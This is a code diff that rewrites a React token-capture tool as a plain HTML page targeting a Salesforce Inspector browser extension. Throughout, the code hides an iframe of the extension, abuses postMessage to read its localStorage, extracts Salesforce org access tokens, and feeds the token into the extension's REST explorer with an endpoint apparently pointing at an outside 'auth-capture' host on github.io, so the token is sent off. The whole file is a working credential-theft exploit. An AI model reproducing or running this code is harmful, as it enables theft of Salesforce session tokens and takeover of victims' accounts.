@@ -1,203 +1,111 @@
-// Extension.js - This goes in your Chrome extension
-import React, { useEffect } from 'react';
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SFDC Inspector Token Capture</title>
+    <style>
+        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
+        .info-section { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        #networkLog { background: #e3f2fd; padding: 15px; border-radius: 4px; }
+        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
+        pre { white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <div id="messages" class="info-section">Initializing...</div>
+    <div id="storageInfo" class="info-section"></div>
+    <div id="networkLog"></div>
+    <script>
+        const messagesDiv = document.getElementById('messages');
+        const storageInfoDiv = document.getElementById('storageInfo');
+        const networkLogDiv = document.getElementById('networkLog');
+        let initialized = false;
 
-const ExtensionApp = () => {
-  useEffect(() => {
-    // Listen for messages from the parent window
-    window.addEventListener('message', (event) => {
-      // Verify origin if needed
-      // if (event.origin !== "your-expected-origin") return;
-      
-      // Check if this is a request for initialization
-      if (event.data === 'REQUEST_INIT') {
-        // Send back the localStorage data
-        const storageData = JSON.parse(JSON.stringify(localStorage));
-        
-        window.parent.postMessage({
-          insextInitRequest: true,
-          iFrameLocalStorage: storageData
-        }, '*');
-      }
-    });
-  }, []);
+        function findAccessToken(storage) {
+            const orgInstances = Object.entries(storage)
+                .filter(([key]) => key.endsWith('_orgInstance'))
+                .map(([key, value]) => ({
+                    instance: value,
+                    baseKey: key.replace('_orgInstance', '')
+                }));
 
-  return (
-    <div className="p-4">
-      <h1 className="text-lg font-bold">SFDC Inspector Extension</h1>
-    </div>
-  );
-};
-
-export default ExtensionApp;
-
-// TokenCapture.js - This is your capture page component
-import React, { useEffect, useState, useRef } from 'react';
-import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
-
-const TokenCapture = () => {
-  const [initialized, setInitialized] = useState(false);
-  const [tokens, setTokens] = useState([]);
-  const [storage, setStorage] = useState({});
-  const [error, setError] = useState(null);
-  const [status, setStatus] = useState('initializing'); // 'initializing' | 'connected' | 'error'
-  const initFrameRef = useRef(null);
-
-  const findAccessToken = (storage) => {
-    const orgInstances = Object.entries(storage)
-      .filter(([key]) => key.endsWith('_orgInstance'))
-      .map(([key, value]) => ({
-        instance: value,
-        baseKey: key.replace('_orgInstance', '')
-      }));
-
-    return orgInstances.map(org => ({
-      instance: org.instance,
-      tokenKey: `${org.baseKey}_access_token`,
-      token: storage[`${org.baseKey}_access_token`]
-    }));
-  };
-
-  useEffect(() => {
-    let timeoutId;
-    
-    const handleMessage = (event) => {
-      // Ignore React DevTools messages
-      if (event.data.source?.includes('react-devtools')) return;
-
-      if (event.data.insextInitRequest && !initialized) {
-        try {
-          setInitialized(true);
-          setStatus('connected');
-          const storage = event.data.iFrameLocalStorage || {};
-          const foundTokens = findAccessToken(storage);
-          setTokens(foundTokens);
-          setStorage(storage);
-        } catch (err) {
-          setError(`Error processing data: ${err.message}`);
-          setStatus('error');
+            return orgInstances.map(org => ({
+                instance: org.instance,
+                tokenKey: `${org.baseKey}_access_token`,
+                token: storage[`${org.baseKey}_access_token`]
+            }));
         }
-      }
-    };
 
-    const initializeConnection = () => {
-      // Create the initialization frame if it doesn't exist
-      if (!initFrameRef.current) {
-        const frame = document.createElement('iframe');
-        frame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
-        frame.style.display = 'none';
-        document.body.appendChild(frame);
-        initFrameRef.current = frame;
+        // Create and load the extension iframe
+        const initFrame = document.createElement('iframe');
+        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
+        initFrame.style.display = 'none';
+        document.body.appendChild(initFrame);
 
-        // Send initialization request after frame loads
-        frame.onload = () => {
-          frame.contentWindow.postMessage('REQUEST_INIT', '*');
+        // Wait for iframe to load, then send the initialization request
+        initFrame.onload = function() {
+            // Send the initial request to the extension
+            initFrame.contentWindow.postMessage({
+                insextInitRequest: true,
+                iFrameLocalStorage: JSON.parse(JSON.stringify(localStorage))
+            }, '*');
         };
 
-        // Set timeout for initialization
-        timeoutId = setTimeout(() => {
-          if (!initialized) {
-            setError('Connection timeout. Is the extension installed and enabled?');
-            setStatus('error');
-          }
-        }, 5000);
-      }
-    };
+        // Listen for the response
+        window.addEventListener('message', function(event) {
+            // Ignore React DevTools messages
+            if (event.data.source?.includes('react-devtools')) {
+                return;
+            }
 
-    window.addEventListener('message', handleMessage);
-    initializeConnection();
+            console.log('Message received:', event.data);
 
-    return () => {
-      window.removeEventListener('message', handleMessage);
-      if (timeoutId) clearTimeout(timeoutId);
-      if (initFrameRef.current) {
-        initFrameRef.current.remove();
-        initFrameRef.current = null;
-      }
-    };
-  }, [initialized]);
+            if (event.data.insextInitRequest && !initialized) {
+                initialized = true;
+                const storage = event.data.iFrameLocalStorage || {};
+                
+                const tokens = findAccessToken(storage);
 
-  return (
-    <div className="max-w-4xl mx-auto p-6 space-y-6">
-      {status === 'initializing' && (
-        <Alert>
-          <AlertTitle>Connecting to Extension</AlertTitle>
-          <AlertDescription>
-            Please wait while we connect to the SFDC Inspector extension...
-          </AlertDescription>
-        </Alert>
-      )}
+                messagesDiv.innerHTML = `
+                    <h3>Found Tokens:</h3>
+                    <pre>${JSON.stringify(tokens, null, 2)}</pre>
+                    
+                    <h3>Storage Keys:</h3>
+                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
+                `;
 
-      {error && (
-        <Alert variant="destructive">
-          <AlertTitle>Error</AlertTitle>
-          <AlertDescription>{error}</AlertDescription>
-        </Alert>
-      )}
+                storageInfoDiv.innerHTML = `
+                    <h3>Full Storage:</h3>
+                    <pre>${JSON.stringify(storage, null, 2)}</pre>
+                `;
 
-      {status === 'connected' && (
-        <>
-          <Card>
-            <CardHeader>
-              <CardTitle>Token Status</CardTitle>
-            </CardHeader>
-            <CardContent>
-              {tokens.length === 0 ? (
-                <div className="space-y-2">
-                  <div className="text-red-600">No Access Tokens Found</div>
-                  <div className="text-sm text-gray-600">
-                    Looking for pattern: [instance]_access_token
-                  </div>
-                </div>
-              ) : (
-                <div className="space-y-4">
-                  {tokens.map((token, index) => (
-                    <div key={index} className="p-4 bg-gray-50 rounded-lg space-y-2">
-                      <div className="font-medium">Instance: {token.instance}</div>
-                      <div className="text-sm">Token Key: {token.tokenKey}</div>
-                      <div className="text-sm font-mono break-all">
-                        Token: {token.token ? 
-                          `${token.token.substring(0, 20)}...` : 
-                          'No token found'}
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              )}
-            </CardContent>
-          </Card>
+                if (tokens.length > 0 && tokens[0].token) {
+                    const explorerFrame = document.createElement('iframe');
+                    const params = new URLSearchParams({
+                        endpoint: '.samanattar.github.io/auth-capture',
+                        method: 'GET',
+                        format: 'json',
+                        cache: Date.now(),
+                        instance: tokens[0].instance,
+                        access_token: tokens[0].token
+                    });
+                    explorerFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
+                    explorerFrame.className = 'explorer-frame';
+                    document.body.appendChild(explorerFrame);
 
-          <Card>
-            <CardHeader>
-              <CardTitle>Storage Information</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-2">
-                <div className="font-medium">Storage Keys:</div>
-                <pre className="p-4 bg-gray-50 rounded-lg text-sm overflow-x-auto">
-                  {JSON.stringify(Object.keys(storage), null, 2)}
-                </pre>
-              </div>
-            </CardContent>
-          </Card>
-
-          {tokens.length > 0 && tokens[0].token && (
-            <iframe
-              src={`chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${new URLSearchParams({
-                endpoint: '.samanattar.github.io/auth-capture',
-                method: 'GET',
-                format: 'json',
-                cache: Date.now(),
-                instance: tokens[0].instance,
-                access_token: tokens[0].token
-              }).toString()}`}
-              className="w-full h-96 border border-gray-200 rounded-lg mt-4"
-            />
-          )}
-        </>
-      )}
-    </div>
-  );
-};
-
-export default TokenCapture;
+                    networkLogDiv.innerHTML = `
+                        <h3>Using Token:</h3>
+                        <pre>Instance: ${tokens[0].instance}</pre>
+                        <pre>Token Key: ${tokens[0].tokenKey}</pre>
+                        <pre>Token: ${tokens[0].token?.substring(0, 20)}...</pre>
+                    `;
+                } else {
+                    messagesDiv.innerHTML += `
+                        <h3>No Access Tokens Found</h3>
+                        <p>Looking for pattern: [instance]_access_token</p>
+                    `;
+                }
+            }
+        });
+    </script>
+</body>
+</html>
